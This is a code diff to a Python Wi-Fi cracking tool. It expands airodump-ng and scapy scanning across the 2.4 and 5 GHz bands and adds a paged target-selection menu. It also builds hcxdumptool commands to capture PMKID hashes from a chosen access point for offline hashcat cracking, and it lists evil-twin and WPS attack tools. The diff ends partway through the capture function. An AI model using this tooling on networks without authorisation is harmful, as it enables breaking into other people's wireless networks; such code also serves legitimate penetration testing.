@@ -140,6 +140,8 @@ class LinuxDistroDetector:
                 'libssl_dev': 'libssl-dev',
                 'build_essential': 'build-essential',
                 'openssl': 'openssl',
+                'pocl': 'pocl-opencl-icd',
+                'ocl_icd': 'ocl-icd-opencl-dev',
             }
         },
         'ubuntu': {
@@ -665,11 +667,13 @@ def install_dependencies():
 
         # WPA3 + extended cracking toolchain
         extended_packages = [
-            'hcxdumptool',    # PMKID capture — key for WPA3-SAE-transition and WPA2-PMKID
-            'hashcat',        # GPU-accelerated cracking (hc22000 for WPA2/WPA3)
-            'hostapd',        # Evil-twin / SAE analysis
-            'wpasupplicant',  # Connection after cracking
-            'reaver',         # WPS fallback
+            'hcxdumptool',    # PMKID capture
+            'hashcat',        # cracking
+            'pocl',           # CPU OpenCL runtime — lets hashcat run without a GPU
+            'ocl_icd',        # OpenCL ICD loader
+            'hostapd',
+            'wpasupplicant',
+            'reaver',
             'python3_dev',
             'python3_venv',
         ]
@@ -863,191 +867,379 @@ def detect_security_from_iw(rsn_info, wpa_info, privacy_info):
 
 
 
-def scan_networks_airodump(interface, monitor_iface, duration=30):
+def scan_networks_airodump(interface, monitor_iface, duration=45):
     """
-    Channel-hopping scan using airodump-ng to discover all SSIDs
-    across 2.4 GHz (ch 1-14) and 5 GHz (ch 36-165).
-    Returns a list of Network named-tuples with security type detected.
+    Channel-hopping scan using airodump-ng.
+    Runs three separate passes — 2.4 GHz, 5 GHz, and combined fallback —
+    so each band gets dedicated dwell time instead of racing through all channels.
     """
-    networks = []
-    tmpdir   = tempfile.mkdtemp(prefix='niixscan_')
-    cap_base = os.path.join(tmpdir, 'scan')
+    all_networks = {}   # bssid -> Network, keeps best signal
 
-    cmd = [
-        'sudo', 'airodump-ng',
-        '--band', 'abg',
-        '--output-format', 'csv',
-        '-w', cap_base,
-        '--write-interval', '1',
-        monitor_iface
-    ]
-
-    try:
-        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        pb   = ProgressBar(duration, label='Scanning all channels')
-        pb.start()
-        time.sleep(duration)
-        pb.stop()
-        proc.terminate()
-        proc.wait(timeout=5)
-    except Exception as e:
-        warn(f"airodump scan error: {e}")
-
-    # Parse CSV — airodump columns:
-    # 0:BSSID  1:First seen  2:Last seen  3:channel  4:Speed
-    # 5:Privacy  6:Cipher  7:Authentication  8:Power  9:beacons
-    # 10:IVs  11:LAN IP  12:ID-length  13:ESSID  14:Key
-    csv_files = [f for f in os.listdir(tmpdir) if f.endswith('.csv')]
-    for csv_name in csv_files:
-        csv_path = os.path.join(tmpdir, csv_name)
+    def run_pass(band_flag, band_label, secs):
+        tmpdir   = tempfile.mkdtemp(prefix='niixscan_')
+        cap_base = os.path.join(tmpdir, 'scan')
+        cmd = [
+            'sudo', 'airodump-ng',
+            '--band', band_flag,
+            '--output-format', 'csv',
+            '-w', cap_base,
+            '--write-interval', '2',
+            monitor_iface
+        ]
+        nets = []
+        proc = None
         try:
-            with open(csv_path, 'r', errors='ignore') as fh:
-                content = fh.read()
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            pb   = ProgressBar(secs, label=f'Scanning {band_label:<6}')
+            pb.start()
+            time.sleep(secs)
+            pb.stop()
+            proc.terminate()
+            try: proc.wait(timeout=5)
+            except Exception: pass
+        except Exception as e:
+            warn(f"airodump pass ({band_label}) error: {e}")
+            if proc:
+                try: proc.terminate()
+                except Exception: pass
 
-            sections   = re.split(r'\n\s*\n', content, maxsplit=1)
-            ap_section = sections[0] if sections else ''
-            lines      = ap_section.strip().split('\n')
+        csv_files = sorted([f for f in os.listdir(tmpdir) if f.endswith('.csv')])
+        for csv_name in csv_files:
+            csv_path = os.path.join(tmpdir, csv_name)
+            try:
+                with open(csv_path, 'r', errors='ignore') as fh:
+                    content = fh.read()
+                sections   = re.split(r'\n\s*\n', content, maxsplit=1)
+                ap_section = sections[0] if sections else ''
+                lines      = ap_section.strip().split('\n')
+                # Skip the two header lines
+                for line in lines[2:]:
+                    parts = [p.strip() for p in line.split(',')]
+                    if len(parts) < 14:
+                        continue
+                    bssid = parts[0].strip()
+                    if not re.match(r'([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', bssid):
+                        continue
+                    try:    signal = int(parts[8].strip())
+                    except: signal = -100
+                    try:    channel = int(parts[3].strip())
+                    except: channel = None
+                    ssid     = parts[13].strip() if len(parts) > 13 else ''
+                    ssid     = ssid or '<Hidden>'
+                    security = detect_security_from_airodump_csv(parts)
+                    nets.append(Network(ssid=ssid, bssid=bssid, channel=channel,
+                                        signal=signal, security=security))
+            except Exception as e:
+                warn(f"CSV parse ({band_label}): {e}")
+        try:
+            shutil.rmtree(tmpdir, ignore_errors=True)
+        except Exception:
+            pass
+        return nets
 
-            for line in lines[2:]:
+    # ── Pass 1: 2.4 GHz (ch 1–13) — 45 s ──────────────────────────
+    info("Pass 1/2 — 2.4 GHz band (ch 1–13)…")
+    for net in run_pass('bg', '2.4GHz', 45):
+        if net.bssid not in all_networks or net.signal > all_networks[net.bssid].signal:
+            all_networks[net.bssid] = net
+    ok(f"2.4 GHz pass: {len(all_networks)} network(s)")
+
+    # ── Pass 2: 5 GHz (ch 36–165, 25 channels) — 60 s ─────────────
+    info("Pass 2/2 — 5 GHz band (ch 36–165)…")
+    before = len(all_networks)
+    for net in run_pass('a', '5GHz ', 60):
+        if net.bssid not in all_networks or net.signal > all_networks[net.bssid].signal:
+            all_networks[net.bssid] = net
+    ok(f"5 GHz pass: +{len(all_networks) - before} additional network(s)")
+
+    return list(all_networks.values())
+
+
+
+
+def _scapy_parse_beacon(pkt):
+    """Parse a Dot11Beacon packet into a Network namedtuple. Returns None on failure."""
+    try:
+        ssid        = '<Hidden>'
+        channel     = None
+        signal      = -100
+        has_rsn     = False
+        has_wpa     = False
+        auth_suites = []
+
+        elt = pkt.getlayer(Dot11Elt)
+        while elt:
+            if elt.ID == 0 and elt.info:
+                ssid = elt.info.decode('utf-8', errors='ignore').strip() or '<Hidden>'
+            elif elt.ID == 3 and elt.info:
+                channel = elt.info[0] if isinstance(elt.info, (bytes, bytearray)) else ord(elt.info)
+            elif elt.ID == 48:
+                has_rsn = True
+                try:
+                    raw = bytes(elt.info)
+                    if len(raw) >= 8:
+                        pc = int.from_bytes(raw[4:6], 'little')
+                        akm_off = 6 + pc * 4
+                        if len(raw) >= akm_off + 2:
+                            ac = int.from_bytes(raw[akm_off:akm_off+2], 'little')
+                            for i in range(ac):
+                                so = akm_off + 2 + i * 4
+                                if len(raw) >= so + 4:
+                                    auth_suites.append(raw[so + 3])
+                except Exception:
+                    pass
+            elif elt.ID == 221 and elt.info and elt.info[:3] == b'\x00\x50\xf2':
+                has_wpa = True
+            try:
+                elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt, 'payload') else None
+            except Exception:
+                break
+
+        if hasattr(pkt, 'dBm_AntSignal'):
+            signal = pkt.dBm_AntSignal
+
+        bssid = pkt.addr2
+        if not bssid:
+            return None
+
+        if has_rsn and 8 in auth_suites:
+            sec = 'WPA3/WPA2' if 2 in auth_suites else 'WPA3'
+        elif has_rsn:
+            sec = 'WPA2'
+        elif has_wpa:
+            sec = 'WPA'
+        else:
+            sec = 'OPEN'
+
+        return Network(ssid=ssid, bssid=bssid, channel=channel, signal=signal, security=sec)
+    except Exception:
+        return None
+
+
+def channel_hopper(iface, channels, stop_event, interval=0.25):
+    """Background thread: cycles through channels on iface while scapy sniffs."""
+    idx = 0
+    while not stop_event.is_set():
+        try:
+            subprocess.run(
+                ['sudo', 'iw', 'dev', iface, 'set', 'channel', str(channels[idx % len(channels)])],
+                capture_output=True, timeout=1
+            )
+        except Exception:
+            pass
+        idx += 1
+        time.sleep(interval)
+
+
+def _parse_airodump_csv_dir(tmpdir):
+    """Parse all airodump CSV files in tmpdir, return list of Network tuples."""
+    nets = []
+    try:
+        csv_files = [f for f in os.listdir(tmpdir) if f.endswith('.csv')]
+    except Exception:
+        return nets
+    for csv_name in csv_files:
+        try:
+            with open(os.path.join(tmpdir, csv_name), 'r', errors='ignore') as fh:
+                content_csv = fh.read()
+            ap_section = re.split(r'\n\s*\n', content_csv, maxsplit=1)[0]
+            for line in ap_section.strip().split('\n')[2:]:
                 parts = [p.strip() for p in line.split(',')]
                 if len(parts) < 14:
                     continue
                 bssid = parts[0].strip()
                 if not re.match(r'([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', bssid):
                     continue
-                try:
-                    signal = int(parts[8].strip())
-                except Exception:
-                    signal = -100
-                try:
-                    channel = int(parts[3].strip())
-                except Exception:
-                    channel = None
-                ssid     = parts[13].strip() if len(parts) > 13 else '<Hidden>'
-                if not ssid:
-                    ssid = '<Hidden>'
+                try:    signal = int(parts[8].strip())
+                except: signal = -100
+                try:    channel = int(parts[3].strip())
+                except: channel = None
+                ssid     = parts[13].strip() or '<Hidden>'
                 security = detect_security_from_airodump_csv(parts)
-                networks.append(Network(ssid=ssid, bssid=bssid, channel=channel,
-                                        signal=signal, security=security))
-        except Exception as e:
-            warn(f"CSV parse error ({csv_name}): {e}")
-
-    try:
-        shutil.rmtree(tmpdir, ignore_errors=True)
-    except Exception:
-        pass
-
-    return networks
-
-
+                nets.append(Network(ssid=ssid, bssid=bssid, channel=channel,
+                                    signal=signal, security=security))
+        except Exception:
+            pass
+    return nets
 
 
 def scan_networks(interface):
-    """Scan for WiFi networks — channel-hopping via airodump-ng, scapy, or iw fallback."""
+    """
+    Full-spectrum scan — three complementary passes merged by BSSID.
+      Pass 1: airodump-ng 2.4 GHz band, 45 s  (channels 1-14, auto-hop)
+      Pass 2: airodump-ng 5 GHz band,   45 s  (channels 36-165, auto-hop)
+      Pass 3: scapy passive sniff,       60 s  with background channel-hopper
+              thread cycling ALL channels so nothing is missed
+    """
     global SCAPY_AVAILABLE, MONITOR_IFACE
 
-    info(f"Scanning on interface  {c(interface, C.BWHITE, C.BOLD)}")
-    info("Enabling monitor mode for full-spectrum scan…")
+    info(f"Starting full-spectrum scan on  {c(interface, C.BWHITE, C.BOLD)}")
 
+    monitor_iface = None
     try:
         subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
                        capture_output=True, timeout=10)
         subprocess.run(['sudo', 'airmon-ng', 'start', interface],
                        capture_output=True, text=True, timeout=15)
         monitor_iface = get_monitor_interface(interface)
+        if not os.path.exists(f'/sys/class/net/{monitor_iface}'):
+            monitor_iface = f'{interface}mon'
+        if not os.path.exists(f'/sys/class/net/{monitor_iface}'):
+            monitor_iface = interface
         MONITOR_IFACE = monitor_iface
-        ok(f"Monitor interface ready  {c(monitor_iface, C.BWHITE, C.BOLD)}")
+        ok(f"Monitor interface  {c(monitor_iface, C.BWHITE, C.BOLD)}")
     except Exception as e:
         err(f"Monitor mode error: {e}")
         return scan_networks_alternative(interface)
 
-    networks = []
+    all_nets = {}
 
-    # ── Primary: airodump-ng channel-hopping (finds ALL SSIDs) ──
-    if check_tool('airodump-ng'):
-        info("Running airodump-ng channel-hopping scan (2.4 GHz + 5 GHz)…")
-        networks = scan_networks_airodump(interface, monitor_iface, duration=30)
-        if networks:
-            ok(f"airodump-ng found {len(networks)} network(s)")
+    def merge(net_list):
+        for net in net_list:
+            if not net.bssid:
+                continue
+            if net.bssid not in all_nets or net.signal > all_nets[net.bssid].signal:
+                all_nets[net.bssid] = net
 
-    # ── Secondary: scapy sniff (supplements airodump results) ──
-    if SCAPY_AVAILABLE and len(networks) < 3:
-        info("Supplementing with scapy passive scan…")
-        scapy_nets = []
-
-        def packet_handler(pkt):
-            if pkt.haslayer(Dot11Beacon):
-                try:
-                    ssid    = "<Hidden>"
-                    channel = None
-                    signal  = -100
-                    has_rsn = False
-                    has_wpa = False
-                    auth_suites = []
-
-                    elt = pkt.getlayer(Dot11Elt)
-                    while elt:
-                        if elt.ID == 0 and elt.info:
-                            ssid = elt.info.decode('utf-8', errors='ignore')
-                        elif elt.ID == 3 and elt.info:
-                            channel = elt.info[0] if isinstance(elt.info, (bytes, bytearray)) else ord(elt.info)
-                        elif elt.ID == 48:   # RSN IE = WPA2/WPA3
-                            has_rsn = True
-                            # Parse AKM suite from RSN IE for WPA3 detection
-                            try:
-                                raw = bytes(elt.info)
-                                # RSN IE layout: 2-ver, 4-group, 2-pairwise count, ...pairwise, 2-akm count, ...akm
-                                if len(raw) >= 8:
-                                    pc = int.from_bytes(raw[4:6], 'little')
-                                    akm_off = 6 + pc * 4
-                                    if len(raw) >= akm_off + 2:
-                                        ac = int.from_bytes(raw[akm_off:akm_off+2], 'little')
-                                        for i in range(ac):
-                                            suite_off = akm_off + 2 + i * 4
-                                            if len(raw) >= suite_off + 4:
-                                                suite = raw[suite_off+3]  # OUI suffix byte
-                                                auth_suites.append(suite)
-                            except Exception:
-                                pass
-                        elif elt.ID == 221 and elt.info and elt.info[:3] == b'\x00\x50\xf2':
-                            has_wpa = True   # WPA vendor IE
-                        elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt, 'payload') else None
-
-                    if hasattr(pkt, 'dBm_AntSignal'):
-                        signal = pkt.dBm_AntSignal
-
-                    bssid = pkt.addr2
-
-                    # AKM suite 8 = SAE (WPA3), 2 = PSK (WPA2), 6 = PSK-SHA256
-                    if has_rsn and 8 in auth_suites:
-                        security = 'WPA3/WPA2' if 2 in auth_suites else 'WPA3'
-                    elif has_rsn:
-                        security = 'WPA2'
-                    elif has_wpa:
-                        security = 'WPA'
-                    else:
-                        security = 'OPEN'
-
-                    scapy_nets.append(Network(ssid=ssid, bssid=bssid, channel=channel,
-                                              signal=signal, security=security))
-                except Exception:
-                    pass
-
+    def airodump_pass(band_flag, band_label, secs):
+        tmpdir   = tempfile.mkdtemp(prefix='niixscan_')
+        cap_base = os.path.join(tmpdir, 'scan')
         try:
-            pb = ProgressBar(SCAN_DURATION, label='Scapy passive scan')
+            proc = subprocess.Popen(
+                ['sudo', 'airodump-ng', '--band', band_flag,
+                 '--output-format', 'csv', '-w', cap_base,
+                 '--write-interval', '2', monitor_iface],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            pb = ProgressBar(secs, label=f'Scan {band_label:<8}')
             pb.start()
-            sniff(iface=monitor_iface, prn=packet_handler, timeout=SCAN_DURATION)
+            time.sleep(secs)
             pb.stop()
-            # Merge unique results
-            existing_bssids = {n.bssid for n in networks}
-            for net in scapy_nets:
-                if net.bssid not in existing_bssids:
-                    networks.append(net)
-                    existing_bssids.add(net.bssid)
+            proc.terminate()
+            try: proc.wait(timeout=5)
+            except Exception: pass
         except Exception as e:
-            warn(f"Scapy supplemental scan error: {e}")
+            try: pb.stop()
+            except Exception: pass
+            warn(f"airodump ({band_label}) error: {e}")
+        nets = _parse_airodump_csv_dir(tmpdir)
+        shutil.rmtree(tmpdir, ignore_errors=True)
+        return nets
 
-    # Stop monitor mode
+    if check_tool('airodump-ng'):
+        info("Pass 1/3 — airodump 2.4 GHz (45 s)…")
+        merge(airodump_pass('bg', '2.4GHz', 45))
+        ok(f"After 2.4 GHz: {c(str(len(all_nets)), C.BYELLOW, C.BOLD)} network(s)")
+
+        info("Pass 2/3 — airodump 5 GHz (45 s)…")
+        before = len(all_nets)
+        merge(airodump_pass('a', '5GHz', 45))
+        ok(f"After 5 GHz:   +{len(all_nets)-before} new  →  {c(str(len(all_nets)), C.BYELLOW, C.BOLD)} total")
+    else:
+        warn("airodump-ng not found — skipping passes 1 and 2")
+
+    if SCAPY_AVAILABLE:
+        channels_all = list(range(1, 15)) + [
+            36, 40, 44, 48, 52, 56, 60, 64,
+            100,104,108,112,116,120,124,128,
+            132,136,140,144,149,153,157,161,165
+        ]
+        stop_hop   = threading.Event()
+        hop_thread = threading.Thread(
+            target=channel_hopper,
+            args=(monitor_iface, channels_all, stop_hop, 0.3),
+            daemon=True
+        )
+
+        scapy_nets = []
+        before     = len(all_nets)
+
+        def pkt_handler(pkt):
+            if not pkt.haslayer(Dot11Beacon):
+                return
+            try:
+                ssid        = '<Hidden>'
+                ch          = None
+                sig         = -100
+                has_rsn     = False
+                has_wpa     = False
+                auth_suites = []
+
+                elt = pkt.getlayer(Dot11Elt)
+                while elt:
+                    if elt.ID == 0 and elt.info:
+                        try:
+                            decoded = elt.info.decode('utf-8', errors='replace').strip('\x00').strip()
+                            if decoded:
+                                ssid = decoded
+                        except Exception:
+                            pass
+                    elif elt.ID == 3 and elt.info:
+                        ch = elt.info[0] if isinstance(elt.info, (bytes, bytearray)) else ord(elt.info)
+                    elif elt.ID == 48:
+                        has_rsn = True
+                        try:
+                            raw = bytes(elt.info)
+                            if len(raw) >= 8:
+                                pc      = int.from_bytes(raw[4:6], 'little')
+                                akm_off = 6 + pc * 4
+                                if len(raw) >= akm_off + 2:
+                                    ac = int.from_bytes(raw[akm_off:akm_off+2], 'little')
+                                    for i in range(ac):
+                                        so = akm_off + 2 + i * 4
+                                        if len(raw) >= so + 4:
+                                            auth_suites.append(raw[so + 3])
+                        except Exception:
+                            pass
+                    elif elt.ID == 221 and elt.info and elt.info[:3] == b'\x00\x50\xf2':
+                        has_wpa = True
+                    try:
+                        nxt = elt.payload
+                        elt = nxt.getlayer(Dot11Elt) if nxt and hasattr(nxt, 'getlayer') else None
+                    except Exception:
+                        break
+
+                if hasattr(pkt, 'dBm_AntSignal'):
+                    sig = pkt.dBm_AntSignal
+
+                bssid = pkt.addr2
+                if not bssid:
+                    return
+
+                if has_rsn and 8 in auth_suites:
+                    sec = 'WPA3/WPA2' if 2 in auth_suites else 'WPA3'
+                elif has_rsn:
+                    sec = 'WPA2'
+                elif has_wpa:
+                    sec = 'WPA'
+                else:
+                    sec = 'OPEN'
+
+                scapy_nets.append(Network(ssid=ssid, bssid=bssid,
+                                          channel=ch, signal=sig, security=sec))
+            except Exception:
+                pass
+
+        info("Pass 3/3 — scapy + channel hopper (60 s, all 2.4+5 GHz channels)…")
+        try:
+            hop_thread.start()
+            pb = ProgressBar(60, label='Scapy hopping ')
+            pb.start()
+            sniff(iface=monitor_iface, prn=pkt_handler, timeout=60, store=False)
+            pb.stop()
+        except Exception as e:
+            try: pb.stop()
+            except Exception: pass
+            warn(f"Scapy error: {e}")
+        finally:
+            stop_hop.set()
+            hop_thread.join(timeout=3)
+
+        merge(scapy_nets)
+        ok(f"After scapy:   +{len(all_nets)-before} new  →  {c(str(len(all_nets)), C.BYELLOW, C.BOLD)} total")
+    else:
+        warn("Scapy not available — install python3-scapy for best coverage")
+
     try:
         subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_iface],
                        capture_output=True, timeout=10)
@@ -1056,19 +1248,13 @@ def scan_networks(interface):
     except Exception:
         pass
 
-    # Deduplicate and sort
-    unique_nets = {}
-    for net in networks:
-        if net.bssid not in unique_nets or net.signal > unique_nets[net.bssid].signal:
-            unique_nets[net.bssid] = net
-
-    result_list = sorted(unique_nets.values(), key=lambda x: x.signal, reverse=True)
-
-    if not result_list:
+    result = sorted(all_nets.values(), key=lambda x: x.signal, reverse=True)
+    if not result:
         warn("No networks found — falling back to iw scan…")
         return scan_networks_alternative(interface)
 
-    return result_list
+    ok(f"Scan complete — {c(str(len(result)), C.BYELLOW, C.BOLD)} unique network(s) found")
+    return result
 
 
 def scan_networks_alternative(interface):
@@ -1165,84 +1351,96 @@ def display_networks_menu(networks):
         err("No networks found")
         return -1
 
-    display_limit = min(20, len(networks))
-    nets = networks[:display_limit]
-
-    section(f"Available Networks  ·  {len(networks)} found")
-
-    hdr = (f"  {c('#', C.BWHITE, C.BOLD):>3}  "
-           f"{c('SSID', C.BWHITE, C.BOLD):<28}  "
-           f"{c('Security', C.BWHITE, C.BOLD):<10}  "
-           f"{c('BSSID', C.BWHITE, C.BOLD):17}  "
-           f"{c('Ch', C.BWHITE, C.BOLD):>3}  "
-           f"{c('Signal', C.BWHITE, C.BOLD):>7}  "
-           f"{c('Quality', C.BWHITE, C.BOLD)}")
-    print(hdr)
-    divider()
-
-    for i, net in enumerate(nets, 1):
-        raw_ssid = net.ssid or '<Hidden>'
-        ssid     = (raw_ssid[:25] + c('…', C.DIM)) if len(raw_ssid) > 25 else raw_ssid
-        ch       = str(net.channel) if net.channel else c('?', C.DIM)
-        bssid    = net.bssid or c('??:??:??:??:??:??', C.DIM)
-        sig      = net.signal
-        sec      = getattr(net, 'security', 'UNKNOWN')
-
-        # Security badge colours
-        if sec == 'WPA3':
-            sec_col = C.BGREEN
-            sec_str = c(f'WPA3      ', C.BGREEN, C.BOLD)
-        elif sec == 'WPA3/WPA2':
-            sec_col = C.BCYAN
-            sec_str = c(f'WPA3/WPA2 ', C.BCYAN, C.BOLD)
-        elif sec == 'WPA2':
-            sec_col = C.BYELLOW
-            sec_str = c(f'WPA2      ', C.BYELLOW, C.BOLD)
-        elif sec == 'WPA':
-            sec_col = C.YELLOW
-            sec_str = c(f'WPA       ', C.YELLOW, C.BOLD)
-        elif sec == 'WEP':
-            sec_col = C.BRED
-            sec_str = c(f'WEP       ', C.BRED, C.BOLD)
-        elif sec == 'OPEN':
-            sec_col = C.BMAGENTA
-            sec_str = c(f'OPEN      ', C.BMAGENTA, C.BOLD)
-        else:
-            sec_col = C.DIM
-            sec_str = c(f'UNKNOWN   ', C.DIM)
-
-        if sig >= -55:
-            sig_col = C.BGREEN;  bars = '▂▄▆█'
-        elif sig >= -70:
-            sig_col = C.BYELLOW; bars = '▂▄▆░'
-        elif sig >= -80:
-            sig_col = C.YELLOW;  bars = '▂▄░░'
-        else:
-            sig_col = C.BRED;    bars = '▂░░░'
-
-        num_s  = c(f'{i:>3}', C.BYELLOW, C.BOLD)
-        ssid_s = c(f'{ssid:<28}', C.BWHITE)
-        bss_s  = c(f'{bssid:17}', C.DIM)
-        ch_s   = c(f'{ch:>3}', C.BCYAN)
-        sig_s  = c(f'{sig:>4} dBm', sig_col)
-        bar_s  = c(f'  {bars}', sig_col, C.BOLD)
-
-        print(f"  {num_s}  {ssid_s}  {sec_str}  {bss_s}  {ch_s}  {sig_s}{bar_s}")
-
-    divider()
-    print()
+    total     = len(networks)
+    page_size = 50
+    page      = 0
 
     while True:
-        try:
-            raw = ask(f"Select target (1–{display_limit}) or q to quit:")
-            if raw.strip().lower() == 'q':
+        start_idx     = page * page_size
+        end_idx       = min(start_idx + page_size, total)
+        nets          = networks[start_idx:end_idx]
+
+        section(f"Networks  ·  {total} found  ·  showing {start_idx+1}–{end_idx}")
+
+        hdr = (f"  {c('#', C.BWHITE, C.BOLD):>4}  "
+               f"{c('SSID', C.BWHITE, C.BOLD):<28}  "
+               f"{c('Security', C.BWHITE, C.BOLD):<10}  "
+               f"{c('BSSID', C.BWHITE, C.BOLD):17}  "
+               f"{c('Ch', C.BWHITE, C.BOLD):>3}  "
+               f"{c('Signal', C.BWHITE, C.BOLD):>7}  "
+               f"{c('Bar', C.BWHITE, C.BOLD)}")
+        print(hdr)
+        divider()
+
+        for i, net in enumerate(nets, start_idx + 1):
+            raw_ssid = net.ssid or '<Hidden>'
+            ssid     = (raw_ssid[:25] + c('…', C.DIM)) if len(raw_ssid) > 25 else raw_ssid
+            ch       = str(net.channel) if net.channel else c('?', C.DIM)
+            bssid    = net.bssid or c('??:??:??:??:??:??', C.DIM)
+            sig      = net.signal
+            sec      = getattr(net, 'security', 'UNKNOWN')
+
+            if sec == 'WPA3':
+                sec_str = c('WPA3      ', C.BGREEN,   C.BOLD)
+            elif sec == 'WPA3/WPA2':
+                sec_str = c('WPA3/WPA2 ', C.BCYAN,    C.BOLD)
+            elif sec == 'WPA2':
+                sec_str = c('WPA2      ', C.BYELLOW,  C.BOLD)
+            elif sec == 'WPA':
+                sec_str = c('WPA       ', C.YELLOW,   C.BOLD)
+            elif sec == 'WEP':
+                sec_str = c('WEP       ', C.BRED,     C.BOLD)
+            elif sec == 'OPEN':
+                sec_str = c('OPEN      ', C.BMAGENTA, C.BOLD)
+            else:
+                sec_str = c('UNKNOWN   ', C.DIM)
+
+            if sig >= -55:
+                sig_col = C.BGREEN;  bars = '▂▄▆█'
+            elif sig >= -70:
+                sig_col = C.BYELLOW; bars = '▂▄▆░'
+            elif sig >= -80:
+                sig_col = C.YELLOW;  bars = '▂▄░░'
+            else:
+                sig_col = C.BRED;    bars = '▂░░░'
+
+            num_s  = c(f'{i:>4}', C.BYELLOW, C.BOLD)
+            ssid_s = c(f'{ssid:<28}', C.BWHITE)
+            bss_s  = c(f'{bssid:17}', C.DIM)
+            ch_s   = c(f'{ch:>3}', C.BCYAN)
+            sig_s  = c(f'{sig:>4} dBm', sig_col)
+            bar_s  = c(f'  {bars}', sig_col, C.BOLD)
+
+            print(f"  {num_s}  {ssid_s}  {sec_str}  {bss_s}  {ch_s}  {sig_s}{bar_s}")
+
+        divider()
+        has_more = end_idx < total
+        has_prev = page > 0
+        nav = []
+        if has_more: nav.append(c('n', C.BCYAN, C.BOLD) + c('=next', C.DIM))
+        if has_prev: nav.append(c('p', C.BCYAN, C.BOLD) + c('=prev', C.DIM))
+        nav.append(c('q', C.DIM) + c('=quit', C.DIM))
+        print(f"  {' · '.join(nav)}")
+        print()
+
+        while True:
+            raw = ask(f"Select (1–{total}) or n/p/q:").strip().lower()
+            if raw == 'q':
                 return -1
-            choice = int(raw.strip())
-            if 1 <= choice <= display_limit:
-                return choice - 1
-            warn(f"Please enter a number between 1 and {display_limit}")
-        except ValueError:
-            warn("Invalid input — enter a number")
+            if raw == 'n' and has_more:
+                page += 1
+                break
+            if raw == 'p' and has_prev:
+                page -= 1
+                break
+            try:
+                choice = int(raw)
+                if 1 <= choice <= total:
+                    return choice - 1
+                warn(f"Enter a number between 1 and {total}")
+            except ValueError:
+                if raw not in ('n', 'p'):
+                    warn("Invalid — enter a number, or n/p/q")
 
 
 def restart_network_manager():
@@ -1257,12 +1455,80 @@ def restart_network_manager():
             pass
 
 
-def capture_pmkid(interface, bssid, channel, ssid, timeout=90):
+def get_hcxdumptool_flags(mon_iface, pcapng_file, filter_file):
     """
-    Use hcxdumptool to capture PMKID from the target AP.
-    PMKID is derived from the AP alone — no client needed.
-    Works on WPA2 and WPA3-transition networks.
-    Returns path to hc22000 hash file, or None on failure.
+    Interrogate hcxdumptool --help at runtime and build a safe command.
+    Returns (cmd_list, info_string).
+
+    Important constraint: --rcascan is a SCAN-ONLY mode and cannot be combined
+    with -w (capture output). We never add any scan/roam flag — hcxdumptool
+    captures passively on whatever channel the interface is already tuned to,
+    which is correct because we lock to the target channel before calling this.
+    """
+    helptext = ''
+    try:
+        for hflag in ['-h', '--help']:
+            r = subprocess.run(
+                ['hcxdumptool', hflag],
+                capture_output=True, text=True, timeout=10
+            )
+            helptext += (r.stdout + r.stderr).lower()
+    except Exception:
+        pass
+
+    notes = []
+
+    # ── Output file flag (-w v7+, -o v6) ─────────────────────────────
+    if re.search(r'\s-w[\s,]', helptext) or '--write' in helptext:
+        out_flag = '-w'
+    else:
+        out_flag = '-o'
+    notes.append(f"out={out_flag}")
+
+    cmd = ['sudo', 'hcxdumptool', '-i', mon_iface, out_flag, pcapng_file]
+
+    # ── Active beacon flag — only add if it can coexist with -w ──────
+    # --active_beacon (v6) is safe with -o/-w
+    # --rcascan / --do_rcascan are SCAN modes, incompatible with -w — NEVER add
+    if re.search(r'--active[_-]beacon', helptext):
+        cmd.append('--active_beacon')
+        notes.append('active=--active_beacon')
+    else:
+        # Passive only — rely on channel lock set before launch
+        notes.append('mode=passive(channel-locked)')
+
+    # ── Status flag (optional cosmetic) ──────────────────────────────
+    if '--enable_status' in helptext:
+        cmd.append('--enable_status=3')
+
+    # ── AP filter ─────────────────────────────────────────────────────
+    if filter_file:
+        if '--filterlist_ap' in helptext:
+            cmd += [f'--filterlist_ap={filter_file}', '--filtermode=2']
+            notes.append('filter=bssid')
+        elif '--filterlist' in helptext:
+            cmd += [f'--filterlist={filter_file}', '--filtermode=2']
+            notes.append('filter=bssid(legacy)')
+        else:
+            notes.append('filter=unavailable')
+
+    return cmd, '  '.join(notes)
+
+
+def capture_pmkid(interface, bssid, channel, ssid, timeout=300):
+    """
+    Capture PMKID from the target AP using hcxdumptool.
+
+    Runs for up to `timeout` seconds (default 5 minutes) but exits early
+    the moment a valid PMKID/EAPOL hash is found.  Sends active association
+    requests every 30 s to elicit a PMKID response from the AP.
+
+    Key fixes vs previous version:
+      - Interface put into monitor mode BEFORE hcxdumptool starts
+      - Correct flag names for both old (<= 6.x) and new (>= 22.x) hcxdumptool
+      - Hash file written to a fresh path each run — never overwritten mid-poll
+      - pcapng file size tracked across polls; growing = AP is responding
+      - Elapsed timer shown live so user sees progress
     """
     global MONITOR_IFACE
 
@@ -1270,181 +1536,675 @@ def capture_pmkid(interface, bssid, channel, ssid, timeout=90):
         warn("hcxdumptool not available — skipping PMKID capture")
         return None
 
-    info(f"PMKID capture on  {c(ssid, C.BWHITE, C.BOLD)}  ·  {c(bssid, C.CYAN)}")
+    info(f"PMKID capture  →  {c(ssid, C.BWHITE, C.BOLD)}  ·  {c(bssid, C.CYAN)}")
+    info(f"Will run for up to  {c(str(timeout) + 's', C.BYELLOW, C.BOLD)}  — exits early on success")
 
     safe_ssid   = re.sub(r'[^\w\-]', '_', ssid)[:30] or 'network'
-    pcapng_file = f'/tmp/pmkid_{safe_ssid}.pcapng'
-    hash_file   = f'pmkid_{safe_ssid}.hc22000'
+    ts          = int(time.time())
+    pcapng_file = f'/tmp/pmkid_{safe_ssid}_{ts}.pcapng'
+    hash_file   = f'pmkid_{safe_ssid}_{ts}.hc22000'
     filter_file = f'/tmp/pmkid_filter_{safe_ssid}.txt'
 
-    # Write BSSID filter (hcxdumptool filterlist format: mac without colons)
+    # ── BSSID filter so we only capture traffic from the target AP ──
     bssid_clean = bssid.replace(':', '').lower()
